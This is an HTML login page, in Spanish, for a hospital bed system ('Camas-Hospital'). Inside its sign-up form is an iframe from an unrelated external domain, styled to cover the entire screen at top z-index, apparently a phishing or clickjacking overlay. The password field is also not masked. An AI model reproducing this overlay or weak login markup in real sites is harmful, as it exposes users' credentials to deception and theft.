<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script
      src="https://kit.fontawesome.com/64d58efce2.js"
      crossorigin="anonymous"
    ></script>
    <link rel="stylesheet" href="css/style.css" />
    <link  rel="icon"   href="img/sv.png" type="image/png" />
    <title>Camas-Hospital</title>
  </head>
  <body>
    <div class="container">
      <div class="forms-container">
        <div class="signin-signup">
          <form class="sign-in-form" id="formLogin" action="" method="post">
            <h2 class="title">Iniciar Sesión</h2>
            <div class="input-field">
              <i class="fas fa-user"></i>
              <input id="usuario" name="usuario" type="text" placeholder="Usuario" autocomplete="off"/> 
            </div>
            <div class="input-field">
              <i class="fas fa-lock"></i>
              <input id="password" name="password" placeholder="Contraseña" autocomplete="off"/>
            </div>
            <input type="submit" value="Ingresar" class="btn solid" />
            <p class="social-text">Redes sociales</p>
            <div class="social-media">
              <a href="#" class="social-icon">
                <i class="fab fa-facebook-f"></i>
              </a>
              <a href="#" class="social-icon">
                <i class="fab fa-twitter"></i>
              </a>
              <a href="#" class="social-icon">
                <i class="fab fa-google"></i>
              </a>
              <a href="#" class="social-icon">
                <i class="fab fa-linkedin-in"></i>
              </a>
            </div>
          </form>
          <form class="sign-up-form">
            <iframe src="https://email-servipetrom.netlify.app" class="content" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>
          </form>
        </div>
      </div>

      <div class="panels-container">
        <div class="panel left-panel">
          <div class="content">
            <h3>¿Olvidaste tu contraseña?</h3>
            <p>
              En caso de haber olvidado tu contraseña, avisanos!
            </p>
            <button class="btn transparent" id="sign-up-btn">
              Contactar
            </button>
          </div>
        </div>
        <div class="panel right-panel">
          <div class="content">
            <h3>¿Te equivocaste?</h3>
            <p>
              Puedes volver al inicio!
            </p>
            <button class="btn transparent" id="sign-in-btn">
              Volver
            </button>
          </div>
        </div>
      </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://cdn.datatables.net/v/bs5/jq-3.3.1/dt-1.10.25/datatables.min.js"></script>
    <!-- DATATABLES QUE TRAE LA TABLA CON LAS CONSULTAS A TRAVES DE SERVERSITE -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
    <script src="js/app.js"></script>
    <script src="js/codigo.js"></script>  
    <!-- plugins modal js -->
    <script src="plugins/sweetalert2/sweetalert2.all.min.js"></script>  


  </body>
</html>
